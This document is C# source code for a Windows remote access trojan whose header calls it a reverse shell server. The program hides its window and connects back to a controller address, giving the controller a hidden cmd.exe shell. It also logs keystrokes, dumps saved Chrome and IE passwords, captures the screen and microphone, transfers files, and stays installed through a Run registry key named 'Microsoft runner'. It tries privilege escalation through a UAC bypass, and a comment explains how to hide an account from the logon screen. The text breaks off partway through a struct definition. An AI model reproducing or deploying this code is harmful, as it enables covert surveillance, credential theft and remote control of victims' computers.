//
// Reverse Portbinding Shell Server - by Paul Chin, revised by NS, 2016-2017
// Aug 26, 2007
//
#define hook


//*-*-*-*-*-*-*-*-*-*-*-*-*-*-*-*-*-*-*-*-*-*-*-*-*-*-*-*-*-*-*-*-*-*-*-*-*-*-*-*-*-*-*-*-*-*-*-*-*-*-*-*-*-*-*-*-*-*-*-*-*-*-*-*-*-*-*-*-*-*-*-*-*-*-*-*-*-*-*-*-
// to remove a user from the logon screen do:
// 
// reg add HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon\SpecialAccounts\UserList /v "administrator" /t REG_DWORD /f /d 0x1
//
// where "administrator" is the user name you wish to remove
//*-*-*-*-*-*-*-*-*-*-*-*-*-*-*-*-*-*-*-*-*-*-*-*-*-*-*-*-*-*-*-*-*-*-*-*-*-*-*-*-*-*-*-*-*-*-*-*-*-*-*-*-*-*-*-*-*-*-*-*-*-*-*-*-*-*-*-*-*-*-*-*-*-*-*-*-*-*-*-*-


using System;
using System.Collections.Generic;
using System.ComponentModel;
using System.Data;
using System.Drawing;
using System.Text;
using System.Windows.Forms;
using System.Net.Sockets;
using System.IO;                        //for Streams
using System.Diagnostics;               //for Process
using System.Runtime.InteropServices;
using System.Security.Principal;   //for keylogger
using System.Threading.Tasks;
using System.Threading;
using CryptEngine;
using System.Drawing.Imaging;
using System.Linq;
using murrayju.ProcessExtensions;


namespace RevereseTcpRat
{
    public partial class Form1 : Form
    {
#if hook
        //These Dll's will handle the hooks. Yaaar mateys!
        [DllImport("user32.dll", CharSet = CharSet.Auto, SetLastError = true)]
        private static extern IntPtr SetWindowsHookEx(int idHook,
            LowLevelKeyboardProc lpfn, IntPtr hMod, uint dwThreadId);

        [DllImport("user32.dll", CharSet = CharSet.Auto, SetLastError = true)]
        [return: MarshalAs(UnmanagedType.Bool)]
        private static extern bool UnhookWindowsHookEx(IntPtr hhk);

        [DllImport("user32.dll", CharSet = CharSet.Auto, SetLastError = true)]
        private static extern IntPtr CallNextHookEx(IntPtr hhk, int nCode,
            IntPtr wParam, IntPtr lParam);
#endif
        [DllImport("kernel32.dll", CharSet = CharSet.Auto, SetLastError = true)]
        private static extern IntPtr GetModuleHandle(string lpModuleName);

        [DllImport( "user32.dll" )]
        public static extern bool GetMessage(ref Message lpMsg, IntPtr handle, uint mMsgFilterInMain, uint mMsgFilterMax);

        // MICROPHONE...
        [DllImport( "winmm.dll", EntryPoint = "mciSendStringA", CharSet = CharSet.Ansi, SetLastError = true, ExactSpelling = true )]
        private static extern int mciSendString(string lpstrCommand, string lpstrReturnString, int uReturnLength, int hwndCallback);


        bool goNow = false, silence = false;
        TcpClient tcpClient;
        NetworkStream networkStream;
        StreamWriter streamWriter;
        StreamReader streamReader;
        Process processCmd;
        StringBuilder strInput;
        int snapShotCounter = 0;

        // USB notifications when inserted
        private const int DBT_DEVICEARRIVAL = 0x8000;
        private const int WM_DEVICECHANGE = 0x0219;
        public const int DbtDevicearrival = 0x8000; // system detected a new device        
        public const int DbtDeviceremovecomplete = 0x8004; // device is gone      
        public const int WmDevicechange = 0x0219; // device change event      
        private const int DbtDevtypDeviceinterface = 5;
        private static readonly Guid GuidDevinterfaceUSBDevice = new Guid("A5DCBF10-6530-11D2-901F-00C04FB951ED"); // USB devices
        private static IntPtr notificationHandle;

        // LOW LEVEL keyboard hook
        private const int WH_KEYBOARD_LL = 13;
        private const int WM_KEYDOWN = 0x0100;
#if hook
        private static LowLevelKeyboardProc _proc = HookCallback;
#endif
        private static IntPtr _hookID = IntPtr.Zero;
        private int useKeylogger = 1, comms;
        private bool sticky = false;

        private const byte COMMMS_ENCRYPTED = 2;

        private static byte MAGIC_BYTE = 0x73;
        private static DateTime lastKeyWritten = DateTime.MinValue;
        string targetIPaddress = "***xxx.xxx.xxx.xxx";

        //////////////////////////////////////////////////////////////////////////////////////////
        // MANAGE THE KEYBOARD HOOK
        private delegate IntPtr LowLevelKeyboardProc(int nCode, IntPtr wParam, IntPtr lParam);
        static DateTime lastEntry = DateTime.Now;
#if hook
        private static IntPtr HookCallback(int nCode, IntPtr wParam, IntPtr lParam)
        {
            if( nCode >= 0 && wParam == ( IntPtr )WM_KEYDOWN )
            {
                int vkCode = Marshal.ReadInt32( lParam );
                //Console.WriteLine( ( Keys )vkCode );
                StreamWriter sw = new StreamWriter( Application.StartupPath + @"\log.txt", true );



                if(( DateTime.Now - lastEntry).TotalSeconds >= 30.0)
                {
                    sw.WriteLine( "\n<" + DateTime.Now.ToString("MM-dd HH:mm:ss") + ">" );
                }
                lastEntry = DateTime.Now;
                sw.Write( "[" + ( Keys )vkCode + "]" );
                sw.Close();
            }
            return CallNextHookEx( _hookID, nCode, wParam, lParam );
        }

        private static IntPtr SetHook(LowLevelKeyboardProc proc)
        {
            using( Process curProcess = Process.GetCurrentProcess() )
            using( ProcessModule curModule = curProcess.MainModule )
            {
                return SetWindowsHookEx( WH_KEYBOARD_LL, proc, IntPtr.Zero /*GetModuleHandle( curModule.ModuleName )*/, 0 );
            }
        }
#endif
        public Form1()
        {
            InitializeComponent();
            RegisterUsbDeviceNotification( this.Handle );
            this.ShowInTaskbar = false;
            this.WindowState = FormWindowState.Minimized;
            this.FormBorderStyle = FormBorderStyle.None;                // new to hide from task manager
            string[] args = Environment.GetCommandLineArgs();
            if( args.Length > 1 )
            {
                targetIPaddress = "***" + args[1];
            }
        }
        protected override CreateParams CreateParams
        {
            get
            {
                var cp = base.CreateParams;
                cp.ExStyle |= 0x80;  // Turn on WS_EX_TOOLWINDOW
                return cp;
            }
        }

        // Specify what you want to happen when the Elapsed event is raised.
        private static void OnTimedEvent(object source, System.Timers.ElapsedEventArgs e)
        {
        }

        protected override void WndProc(ref Message m)
        {
            base.WndProc( ref m );
            if( m.Msg == WmDevicechange )
            {
                switch( ( int )m.WParam )
                {
                    case DbtDeviceremovecomplete:
                        Usb_DeviceRemoved(); // this is where you do your magic
                        break;
                    case DbtDevicearrival:
                        Usb_DeviceAdded(); // this is where you do your magic
                        break;
                }
            }
        }   


        private void Form1_Shown(object sender, EventArgs e)
        {
            if( useKeylogger != 0 )
            {
#if hook
                // try to also run a keylogger
                _hookID = SetHook( _proc );
#endif
            }

            this.Hide(); 
            timer1.Enabled = false;
            if( targetIPaddress.Contains( "x"))
                targetIPaddress = "***192.168.1.105";
            //targetIPaddress = "***192.168.1.12";
            //targetIPaddress = "***10.0.0.106";
            //targetIPaddress = "***192.168.1.106";
            /*
                        System.Timers.Timer hookTimer = new System.Timers.Timer();
                        hookTimer.Elapsed += new System.Timers.ElapsedEventHandler( OnTimedEvent );
                        hookTimer.Interval = 500;
                        hookTimer.Enabled = true;
            */


            Thread handler = new Thread( mainThreadProc );
            handler.Priority = ThreadPriority.Normal/*AboveNormal*/;
            handler.Name = "rtcp rat";
            handler.Start();

            Message mess = Message.Create( IntPtr.Zero, 0, IntPtr.Zero, IntPtr.Zero );
            DateTime lastSec = DateTime.Now;
            while( GetMessage( ref mess, IntPtr.Zero, 0, 0 ) == true)
            {
            }
        } // end formShown


    /// <summary>
    /// Registers a window to receive notifications when USB devices are plugged or unplugged.
    /// </summary>
    /// <param name="windowHandle">Handle to the window receiving notifications.</param>
    public static void RegisterUsbDeviceNotification(IntPtr windowHandle)
    {
        DevBroadcastDeviceinterface dbi = new DevBroadcastDeviceinterface
        {
            DeviceType = DbtDevtypDeviceinterface,
            Reserved = 0,
            ClassGuid = GuidDevinterfaceUSBDevice,
            Name = 0
        };

        dbi.Size = Marshal.SizeOf(dbi);
        IntPtr buffer = Marshal.AllocHGlobal(dbi.Size);
        Marshal.StructureToPtr(dbi, buffer, true);

        notificationHandle = RegisterDeviceNotification(windowHandle, buffer, 0);
    }

    /// <summary>
    /// Unregisters the window for USB device notifications
    /// </summary>
    public static void UnregisterUsbDeviceNotification()
    {
        UnregisterDeviceNotification(notificationHandle);
    }

    [DllImport("user32.dll", CharSet = CharSet.Auto, SetLastError = true)]
    private static extern IntPtr RegisterDeviceNotification(IntPtr recipient, IntPtr notificationFilter, int flags);

    [DllImport("user32.dll")]
    private static extern bool UnregisterDeviceNotification(IntPtr handle);

    [StructLayout(LayoutKind.Sequential)]
    private struct DevBroadcastDeviceinterface
    {
        internal int Size;
        internal int DeviceType;
        internal int Reserved;
        internal Guid ClassGuid;
        internal short Name;
    }

        private void mainThreadProc()
        {
            for( ; ; )
            {

                RunServer();
                System.Threading.Thread.Sleep( 5000 );  //Wait 5 seconds
            }                                           //then try again
        }

        /// <summary>
        /// ////////////////////////////////////////////////////////////////////
        /// </summary>
        private void RunServer()
        {
            strInput = new StringBuilder();
            tcpClient = new TcpClient();
            if( true )
            {
                try
                {
                    int g3 = 10000;
                    for( int i = 0; i < 10; i++ )
                        g3 = g3 ^ 0x100;


                    tcpClient.ExclusiveAddressUse = false;
                    /*
                    tcpClient.Connect( targetIPaddress.Substring( 3), 6667 );
                     */
                    //MessageBox.Show( "before connect" );
                    tcpClient.Connect( targetIPaddress.Substring( 3 ), /*6667*/81 );
                    //MessageBox.Show( "after connect" );

                    int g2 = 10000;
                    for( int i = 0; i < 10; i++ )
                        g2 = g2 ^ 0x100;

                    
                    networkStream = tcpClient.GetStream();

                    int g4 = 10000;
                    for( int i = 0; i < 10; i++ )
                        g2 = g2 ^ 0x100;


                   
                    streamReader = new StreamReader(networkStream, Encoding.UTF8);
                    streamWriter = new StreamWriter(networkStream);

                    if(( comms=getPassword()) == 0 )
                    {
                        Cleanup();
                        return;
                    }
                    
                    System.Reflection.Assembly assembly = System.Reflection.Assembly.GetExecutingAssembly();
                    FileVersionInfo fvi = FileVersionInfo.GetVersionInfo( assembly.Location );
                    string version = fvi.FileVersion;

                    streamWriter.WriteLine( "\r\n--------------------------\r\nrat Version " + version + "\r\n--------------------------\r\n" );

                }
                catch (Exception err) 
                {
                    logger( "not passing first part ---> " + err.Message );
                    return; 
                } //if no Client don't continue
                
                processCmd = new Process();
                
                
                processCmd.StartInfo.CreateNoWindow = true;
                processCmd.StartInfo.UseShellExecute = false;
                
                processCmd.StartInfo.RedirectStandardOutput = true;
                processCmd.StartInfo.RedirectStandardInput = true;
                processCmd.StartInfo.RedirectStandardError = true;
                
                processCmd.OutputDataReceived += new DataReceivedEventHandler(CmdOutputDataHandler);
                processCmd.ErrorDataReceived += new DataReceivedEventHandler( CmdOutputDataHandler );
                processCmd.StartInfo.FileName = "cmd.exe";

                int g = 10000;
                for( int i = 0; i < 1000000; i++ )
                    g = g ^ 0x100;
                 
                processCmd.Start();

                g = 10000;
                for( int i = 0; i < 1000000; i++ )
                    g = g ^ 0x100;

                //processCmd.BeginOutputReadLine();

                goNow = true;
            }
            processCmd.BeginOutputReadLine();
            processCmd.BeginErrorReadLine();

            // place in 50secs timeout, so if something goes wrong
            // the rat would reset the socket every about 1 minute
            tcpClient.ReceiveTimeout = 60000;
            //tcpClient.SendTimeout = 60000;

            while (true)
            {
                try
                {
                    //! note if don't get anything for 50 seconds the process will clear everything and restart
                    // .....DO NOT CHANGE THIS LINE TO TIMEOUT ZERO......
                    tcpClient.ReceiveTimeout = 0;
                    string request;
                    
                    //poll the socket
                    if( tcpClient.Client.Poll(10000000, SelectMode.SelectRead))
                    {
                        tcpClient.ReceiveTimeout = 10000;
                        request = streamReader.ReadLine();
                        if( comms == COMMMS_ENCRYPTED)
                            request = DecryptString( request );
                    }
                    else
                    {
                        // NO NEED?
                        //streamWriter.WriteLine("<--K-A-->");
                        //streamWriter.Flush();
                        if( IsConnected( tcpClient.Client ) && tcpClient.Connected )
                        {
                            int to = tcpClient.ReceiveTimeout;
                            tcpClient.ReceiveTimeout = 100;
                            streamReader.ReadLine();            // read out the OK
                            tcpClient.ReceiveTimeout = to;
                            continue;
                        }
                        else
                        {
                            Cleanup();
                            break;
                        }
                    }


                    //string request = streamReader.ReadLine();
                    if( request != null )
                    {
                        // NOTE: This requires a dll - ProcessExtensions.dll which must be copied to the target
                        // NOTE2: This doesn't seem to work... The privileges required are too high...
                        //        needed TCB priv but can't get it. Only a SYSTEM service can
                        if( request == "RUNAS-USER" )
                        {
                            //NativeMethods.CreateProcessAsUser( myName, "" );
                            //String applicationName = "cmd.exe";

                            // launch the application
                            String applicationName = "cmd.exe";

                            // launch the application
                            Toolkit.ApplicationLoader.PROCESS_INFORMATION procInfo;
                            Toolkit.ApplicationLoader.StartProcessAndBypassUAC(applicationName, out procInfo);

                            request = "";
                        }
                        else if( request == "RUNAS-USER2" )
                        {
                            string myExeName = System.Reflection.Assembly.GetEntryAssembly().Location;
                            ProcessExtensions.StartProcessAsCurrentUser( myExeName );
                            request = "";
                        }
                        else if( request.ToUpper() == "DUMP PASSWORDS" )
                        {
                            streamWriter.Write( myPwdExtractor.extractPwds.extractChrome());
                            streamWriter.Write( myPwdExtractor.extractPwds.dumpIEpasswords());
                            request = "";
                        }
                        else if( request.ToUpper() == "DUMP CHROME" )
                        {
                            streamWriter.Write( myPwdExtractor.extractPwds.extractChromeUrls() );
                            request = "";
                        }
                        else if( request.ToUpper().StartsWith( "UNLOAD SQL"))
                        {
                            myPwdExtractor.extractPwds.UnloadModule( "sqlite3" );
                            streamWriter.WriteLine( "...OK..." );
                            streamWriter.Flush();
                            request = "";
                        }
                        //
                        // KILL THIS TASK WITH /F
                        if( request.StartsWith( "killme" ) )
                        {
                            Process process = new Process();
                            process.StartInfo.WindowStyle = ProcessWindowStyle.Hidden;
                            process.StartInfo.CreateNoWindow = true;
                            process.StartInfo.FileName = "taskkill";
                            process.StartInfo.Arguments = "/pid " + Process.GetCurrentProcess().Id.ToString() + " /f";
                            process.Start();
                            request = "";
                        }

                        ////////////////////////////////
                        // GET DESKTOP IMAGE
                        string addedName = "1";
                        if( request.StartsWith( "^!^!" ) )
                        {
                            if( request.Length > 4 )
                            {
                                addedName = request.Substring( 5 );
                            }
                            Bitmap bmp = snapShot.GetDesktopImage();
                            bmp.Save( @"screen" + addedName + ".png", ImageFormat.Png );


#if zero
                            Rectangle bounds = this.Bounds;
                            using( Bitmap bitmap = new Bitmap( bounds.Width, bounds.Height ) )
                            {
                                using( Graphics g = Graphics.FromImage( bitmap ) )
                                {
                                    g.CopyFromScreen( new Point( bounds.Left, bounds.Top ), Point.Empty, bounds.Size );
                                }
                                //bitmap.Save( "test.jpg", ImageFormat.Jpeg );
                            }
#endif

                            request = "";
                            continue;
                        }
                        // PUT command
                        if( request == "!!!!" )
                        {   // read another line with the length
                            string filename = streamReader.ReadLine();
                            string byteLength = streamReader.ReadLine();

                            int bytel = Convert.ToInt32( byteLength );

                            // sends acknowledge to client
                            string ack = "OK" + bytel.ToString() + "\r\n";
                            byte[] data = Encoding.UTF8.GetBytes( ack );
                            streamWriter.BaseStream.Write( data, 0, data.Length );

                            byte[] buffer = new byte[bytel];
                            int read = readFile( ref buffer, bytel );
                            if( read == bytel )
                                File.WriteAllBytes( filename, buffer );
                            else
                                break;
                            request = "";//                        "echo " + filename + " OK";

                            // send receive end and OK
                            string rxack = "RX" + bytel.ToString() + "\r\n";
                            data = Encoding.UTF8.GetBytes( rxack );
                            streamWriter.BaseStream.Write( data, 0, data.Length );
                        }

                        else if( request.ToLower().Contains( "enum drives" ) )
                        {
                            DriveInfo[] info = DriveInfo.GetDrives();
                            streamWriter.WriteLine( "\n!!GOLD!!NAME\tTYPE     \tSIZE" );
                            streamWriter.WriteLine( "====\t=========\t========" );
                            for( int i = 0; i < info.Length; i++ )
                            {
                                if( !info[i].IsReady )
                                    continue;
                                string type = info[i].DriveType.ToString();
                                if( info[i].DriveType.ToString().Length < 8 )
                                    type += "\t";

                                streamWriter.WriteLine( "!!WHITE!!" + info[i].Name + "\t" + type + "\t" + ( info[i].TotalSize / 1000000 ).ToString() + "MB" );
                            }
                            streamWriter.WriteLine();
                            streamWriter.Flush();
                            request = "";
                        }

                        else if( request.ToLower().Contains( "isadmin" ) )
                        {
#if zero
                            processCmd.StandardInput.WriteLine(
                                "@echo off \r\n" + "setlocal & " + "set runState=\"user\" & " +
                                "echo  & echo User name: & whoami &" +
                                "whoami /groups | findstr /b /c:\"Mandatory Label\\High Mandatory Level\" > nul && set runState=admin && echo !!GREEN!!Running state Admin & " +
                                "whoami /groups | findstr /b /c:\"Mandatory Label\\System Mandatory Level\" > nul && set runState=system && echo !!YELLOW!!Running state System &" +
                                "if \"%runState%\"==\"user\" (echo !!RED!!Running as user!) &" +
                                ":end & SET r & @echo on" );
#else
                            ProcessStartInfo startInfo = new ProcessStartInfo( "whoami", "/groups" )
                            {
                                WindowStyle = ProcessWindowStyle.Hidden,
                                UseShellExecute = false,
                                RedirectStandardOutput = true,
                                CreateNoWindow = true
                            };
                            string outputString;
                            bool isadminsys = false;
                            Process process = Process.Start( startInfo );
                            process.OutputDataReceived += (sender, e) =>
                            {
                                outputString = e.Data;
                                if( outputString != null && outputString.Contains( "Mandatory Label\\High Mandatory Level" ) )
                                {
                                    streamWriter.WriteLine( "\n!!LAWNGREEN!!Running state Admin" );
                                    streamWriter.Flush();
                                    isadminsys = true;
                                }
                                else if( outputString != null && outputString.Contains( "Mandatory Label\\System Mandatory Level" ) )
                                {
                                    streamWriter.WriteLine( "\n!!YELLOW!!Running state System" );
                                    streamWriter.Flush();
                                    isadminsys = true;
                                }
                            };
                            process.Start();
                            process.BeginOutputReadLine();
                            process.WaitForExit( 5000 );
                            if( !isadminsys )
                            {
                                streamWriter.WriteLine( "\n!!CORNFLOWERBLUE!!Running as user" );
                                streamWriter.Flush();
                            }
                            // We may not have received all the events yet!
                            request = "";

#endif
                            //processCmd.StandardInput.WriteLine( "@echo off && whoami /groups | findstr /b /c:\"Mandatory Label\\High Mandatory Level\" && echo Running as admin && echo on" );

                        }
                        else if( request.ToLower() == "elevate!" )
                        {
                            string exe = ExecutingFolder.FullName;
                            processCmd.StandardInput.WriteLine( "@echo off\n SET curdir=%cd% & cd " + exe + " & cd elevate & win7elevate.x64.exe /c cmd & cd %cd% & echo on" );
                        }
                        else if( request.ToLower() == "snap!" )
                        {
                            string exe = ExecutingFolder.FullName;
                            processCmd.StandardInput.WriteLine( "@echo off\n SET curdir=%cd% & cd " + exe + " & cd nircmd & nircmd.exe savescreenshot screen1.png\n cd %cd% & echo on" );
                        }
                        //
                        // SEARCH
                        else if( request == "****" )
                        {
                            silence = true;

                            string filename = streamReader.ReadLine();
                            DirectoryInfo di = new DirectoryInfo( @"./" );
                            //
                            // oh oh... requested the new asterisks????
                            var f = di.GetFiles( filename );
                            // send the number of files found
                            string lengthdata = "\r\n" + f.Length.ToString() + "\r\n";
                            byte[] data = Encoding.UTF8.GetBytes( lengthdata );
                            streamWriter.BaseStream.Write( data, 0, data.Length );
                            //
                            // send all the filename back to client                        
                            foreach( var fi in f )
                            {
                                streamWriter.WriteLine( fi.Name );
                                streamWriter.Flush();
                            }
                            request = "";
                            silence = false;
                        }
                        // GET command
                        else if( request == "@@@@" )
                        {
                            string filename = streamReader.ReadLine();
                            string cwd = System.IO.Directory.GetCurrentDirectory();
                            if( File.Exists( filename ) )
                            {
                                silence = true;
                                try
                                {
                                    byte[] fileBytes = File.ReadAllBytes( filename );
                                    string lengthdata = /*"\r\n" +*/ fileBytes.Length.ToString() + "\r\n";
                                    byte[] data = Encoding.UTF8.GetBytes( lengthdata );
                                    streamWriter.BaseStream.Write( data, 0, data.Length );
                                    string ok = streamReader.ReadLine();
                                    if( ok != "OK" )
                                    {
                                        silence = false;
                                    }
                                    else
                                    {
                                        streamWriter.BaseStream.Write( fileBytes, 0, fileBytes.Length );
                                        request = ""; //"echo " + filename + " OK";
                                        silence = false;
                                    }
                                }
                                catch( IOException ex )
                                {
                                    streamWriter.WriteLine( ex.Message );
                                    streamWriter.Flush();
                                    silence = false;
                                }
                            }
                            else
                            {
                                string lengthdata = "\r\n-1\r\n";
                                byte[] data = Encoding.UTF8.GetBytes( lengthdata );
                                streamWriter.BaseStream.Write( data, 0, data.Length );
                                silence = false;
                            }
                        }
                        // STICKY set registry
                        else if( request == "STICKY" )
                        {
                            string myName = System.Reflection.Assembly.GetEntryAssembly().Location;
                            Process process = new Process();
                            process.StartInfo.WindowStyle = ProcessWindowStyle.Hidden;
                            process.StartInfo.CreateNoWindow = true;
                            process.StartInfo.FileName = "reg.exe";

                            myName = myName.Substring( 0, myName.Length - 4 );      // remove the .exe at the end...
                            process.StartInfo.Arguments = "ADD \"HKCU\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run\" /V \"Microsoft runner\" /t REG_SZ /F /D \"" + myName + "\"";
                            process.Start();
                            request = "";
                        }
                        else if( request == "TEST STICKY" )
                        {
                            ProcessStartInfo startInfo = new ProcessStartInfo( "reg.exe", "QUERY \"HKCU\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run\"" )
                            {
                                WindowStyle = ProcessWindowStyle.Hidden,
                                UseShellExecute = false,
                                RedirectStandardOutput = true,
                                CreateNoWindow = true
                            };
                            string outputString;
                            sticky = false;
                            Process process = Process.Start( startInfo );
                            process.OutputDataReceived += (sender, e) =>
                                {
                                    outputString = e.Data;
                                    if( outputString != null && outputString.Contains( "Microsoft runner" ) )
                                    {
                                        sticky = true;
                                        streamWriter.WriteLine( "\n!!YELLOW!!WE ARE STICKY!" );
                                        outputString = outputString.Replace("    ", "\n!!SILVER!!");
                                        streamWriter.WriteLine(outputString);
                                        streamWriter.Flush();
                                    }
                                };
                            process.BeginOutputReadLine();
                            process.Start();
                            process.WaitForExit();
                            // We may not have received all the events yet!
                            request = "";
                        }
                        else if( request == "PID?" )
                        {
                            Process pr = Process.GetCurrentProcess();
                            streamWriter.WriteLine( "\n!!GRAY!!Process Name: " + pr.ProcessName + ", Pid: " + pr.Id.ToString() + ", Session: " + pr.SessionId);
                            string myExeName = System.Reflection.Assembly.GetEntryAssembly().Location;
                            streamWriter.WriteLine( "\n!!GRAY!!Exe Location: " + myExeName );
                            string calling = System.Reflection.Assembly.GetCallingAssembly().Location;
                            streamWriter.WriteLine( "\n!!GRAY!!Calling Exe: " + calling);
                            streamWriter.Flush();
                            request = "";
                        }
                        //
                        // record from microphone
                        else if( request.Contains( "MIC" ) )
                        {
                            streamWriter.WriteLine( "\n!!GRAY!!Recording Started" );
                            streamWriter.Flush();

                            int time = 10;
                            if( request.Length > 4 )
                                time = Convert.ToInt32( request.Substring( 4 ) );
                            // START RECORDING
                            mciSendString( "open new Type waveaudio Alias recsound", "", 0, 0 );
                            mciSendString( "record recsound", "", 0, 0 );

                            for (int p = 0; p < time; p++)
                            {
                                Thread.Sleep(1000);
                                streamWriter.WriteLine( p.ToString() + " seconds");
                                streamWriter.Flush();
                            }

                            // STOP RECORDING
                            mciSendString( @"save recsound " + "Hell" + ".wav", "", 0, 0 );
                            mciSendString( "close recsound ", "", 0, 0 );
                            streamWriter.WriteLine( "\n!!BROWN!!Recording Ended" );
                            streamWriter.Flush();
                        }
                        //
                        else
                        {
                            if( request.Length > 128 )
                                continue;
                            strInput.Append( request );
                            strInput.Append( "\n" );
                            if( strInput.ToString().LastIndexOf( "terminate" ) >= 0 )
                                StopServer();
                            if( strInput.ToString().LastIndexOf( "exit" ) >= 0 )
                                throw new ArgumentException();
                            processCmd.StandardInput.WriteLine( strInput );
                            strInput.Remove( 0, strInput.Length );
                        }
                    } // endif have data
                    else
                    {
                        if( !/*tcpClient.Connected*/IsConnected( tcpClient.Client ) )
                        {
                            Cleanup();
                            break;
                        }
                        else
                        {
                            streamWriter.Write( "." );
                            streamWriter.Flush();
                        }
                    }
                } // end try
                catch( IOException ecc )
                {
                    if( /*tcpClient.Connected*/IsConnected( tcpClient.Client ) )
                    {
                        try { 
                            streamWriter.WriteLine( "<--K-A-->" );
                            streamWriter.Flush();
                        }
                        catch( Exception ee)
                        {
                        }
                        continue;
                    }
                    else
                    {
                        Cleanup();
                        break;
                    }
                }
                catch( Exception err )
                {                               
                    streamWriter.WriteLine( "!!RED!!ERROR: " + err.Message + "\n" + err.StackTrace);
                    streamWriter.Flush();
                    Cleanup();
                    break;
                }
            } // endwhile true
        }
#if zero
        public bool IsConnected(Socket socket)
        {
            try
            {
                return !( socket.Poll( 1, SelectMode.SelectRead ) && socket.Available == 0 );
            }
            catch( SocketException ) { return false; }
        }
#endif


        /**
         * @brief this function reads from stream with timeout
         * 
         * @returns the length of the received data (string)
         *          or zero if nothing was received
         */ 
        int readFromStream(ref string request)
        {
            request = "";
            try
            {
                request = streamReader.ReadLine();
            }
            catch( IOException ioe)
            {
            }
            return request.Length;
        }


        // return 1 if normal comms password, and 2 if encrypted? comms is requested, 0 if passwor dis not correct
        int getPassword()
        {
            string req = "", pwd = "";
            if( readFromStream( ref req) > 0 )
            {
                // prepare pwd
                for( int i = 0; i < 12; i++ )
                {
                    pwd += (char)((i / 2) + 0x31);
                }
                if( req.Contains( pwd) )
                    return 1;
                else if( req.Contains( pwd.Substring( 0, 10)))
                    return 2;
                else 
                    return 0;
            }
            return 0;
        }


        private DirectoryInfo ExecutingFolder
        {
            get
            {
                return new DirectoryInfo(
                    System.IO.Path.GetDirectoryName(
                        System.Reflection.Assembly.GetExecutingAssembly().Location ) );
            }
        }
        /**
         * @brief       reads a numBytes amount of bytes from streamReader
         * 
         * @returns     number of bytes read
         * 
         **/ 
        private int readFile(ref byte[] buffer, int numBytes)
        {
            Array.Resize( ref buffer, numBytes );
            int inx = 0;
            tcpClient.ReceiveTimeout = 5000;
            try
            {
                while( numBytes > 0 )
                {
                    int l = streamReader.BaseStream.Read( buffer, inx, numBytes );
                    if( l <= 0 )
                        break;
                    inx += l;
                    numBytes -= l;
                    System.Threading.Thread.Sleep( 20 ); //Wait 5 seconds
                } // endwhile
            }
            catch( Exception e )
            {
            }
            tcpClient.ReceiveTimeout = 0;
            return inx;
        } // endfunc


        private void Usb_DeviceRemoved()
        {
            try
            {
                streamWriter.WriteLine( "\n!!ORANGE!!USB Device Removed" );
                streamWriter.Flush();
            }
            catch
            {
            }
        }
        private void Usb_DeviceAdded()
        {
            try
            {
                streamWriter.WriteLine( "\n!!WHITE!!USB Device Added" );
                streamWriter.Flush();
            }
            catch
            {
            }
        }


        private void Cleanup()
        {
            try { processCmd.Kill(); } catch (Exception err) { };
            try
            {
                streamReader.Close();
                streamWriter.Close();
                networkStream.Close();
                tcpClient.Close();
            }
            catch { }
        }

        private void StopServer()
        {
            Cleanup();
#if hook
            UnhookWindowsHookEx( _hookID );
#endif
            System.Environment.Exit(System.Environment.ExitCode);
        }



        /*
                 ____  _____ _   _ ____     ____ __  __ ____    ____    _  _____  _    
                / ___|| ____| \ | |  _ \   / ___|  \/  |  _ \  |  _ \  / \|_   _|/ \   
                \___ \|  _| |  \| | | | | | |   | |\/| | | | | | | | |/ _ \ | | / _ \  
                 ___) | |___| |\  | |_| | | |___| |  | | |_| | | |_| / ___ \| |/ ___ \ 
                |____/|_____|_| \_|____/   \____|_|  |_|____/  |____/_/   \_\_/_/   \_\
                                                                                                
         */
        private void CmdOutputDataHandler(object sendingProcess, DataReceivedEventArgs outLine)
        {
            StringBuilder strOutput = new StringBuilder();

            if (!String.IsNullOrEmpty(outLine.Data))
            {
                try
                {
                    strOutput.Append(outLine.Data);

                    // not sure if this is necessary...???!!
                    string fs = strOutput.ToString();
                    int f1 = fs.IndexOf( ':');
                    // this may be the directory prompt... read it and change current directory accordingly
                    if( f1 == 1 && fs.Contains( ">"))
                    {
                        int f2 = fs.IndexOf( ">");
                        Directory.SetCurrentDirectory( fs.Substring( 0, f2));
                    }
                    streamWriter.WriteLine(strOutput);
                    streamWriter.Flush();
                }
                catch (Exception err) { }
            }
        }


        /*
        byte[] simpleEncrypt( string what)
        {
            return 
        }
        */
        string simpleDecrypt(byte[] what)
        {
            string ret = "";
            foreach( byte b in what )
            {
                 ret += (char)(byte)(b ^ MAGIC_BYTE);
            }
            return ret;
        }


        private void timer1_Tick(object sender, EventArgs e)
        {
            if( goNow )
            {
                processCmd.BeginOutputReadLine();
                timer1.Stop();
            }
        }

        public bool IsConnected(Socket socket)
        {
            try
            {
                byte[] a = { 0x07, 0x0d, 0x0a };
                socket.Send(a);
                return !( socket.Poll( 1, SelectMode.SelectRead ) && socket.Available == 0 );
            }
            catch( SocketException ) { return false; }
            catch( ObjectDisposedException ) { return false; }
        }

        private void logger(string text)
        {
            File.WriteAllText( "crypt.log", DateTime.Now.ToString() + "> " + text );
        }


        string DecryptString(string req)
        {
            for( int i = 0; i < req.Length; i++)
            {
                char a = req[i];
                if( ( a >= 'A' && a <= 'Z' ) || ( a >= 'a' && a <= 'z' ) )
                {
                    char[] letters = req.ToCharArray();
                    letters[i] = (char)(a - 1);
                    req = string.Join("", letters);
                }
            }
            return req;
        }

        ///////////////////////////////////////////////////////////////////////////
        public const int STARTF_USESHOWWINDOW = 0x0000000;
        public const int SW_HIDE = 0;

        class NativeMethods
        {
            [StructLayout( LayoutKind.Sequential )]
            public struct STARTUPINFO
            {
                public Int32 cb;
                public string lpReserved;
                public string lpDesktop;
                public string lpTitle;
                public Int32 dwX;
                public Int32 dwY;
                public Int32 dwXSize;
                public Int32 dwXCountChars;
                public Int32 dwYCountChars;
                public Int32 dwFillAttribute;
                public Int32 dwFlags;
                public Int16 wShowWindow;
                public Int16 cbReserved2;
                public IntPtr lpReserved2;
                public IntPtr hStdInput;
                public IntPtr hStdOutput;
                public IntPtr hStdError;
            }

            [StructLayout( LayoutKind.Sequential )]
            public struct PROCESS_INFORMATION
            {
                public IntPtr hProcess;
                public IntPtr hThread;
                public Int32 dwProcessID;
                public Int32 dwThreadID;
            }

            [StructLayout( LayoutKind.Sequential )]
            public struct SECURITY_ATTRIBUTES
            {
                public Int32 Length;
                public IntPtr lpSecurityDescriptor;
                public bool bInheritHandle;
            }

